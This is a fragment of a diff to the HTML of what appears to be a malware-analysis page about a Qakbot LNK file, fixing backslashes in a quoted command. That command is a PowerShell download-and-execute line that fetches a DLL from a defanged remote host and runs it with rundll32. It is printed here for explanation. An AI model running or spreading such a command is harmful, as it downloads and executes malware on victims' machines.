@@ -638,7 +638,7 @@ considered suspicious files.&lt;/li&gt;
 &lt;a href="https://analyze.intezer.com/files/a1e2a9bc32a2ff8392cc70586e34fb9ba86c5aaad3dffee0d4940a8adf742b13"target="_blank" rel="noopener"&gt;an LNK file used by Qakbot&lt;/a&gt;.
 It downloads a DLL from a remote location and executes it.&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:WindowsSystem32WindowsPowerShellv1.0powershell.exe -NoExit iwr -Uri
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit iwr -Uri
 hxxps://news-wellness[.]com/5MVhfo8BnDub/D.png -OutFile
 $env:TEMPtest.dll;Start-Process rundll32.exe $env:TEMPtest.dll,jhbvygftr&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
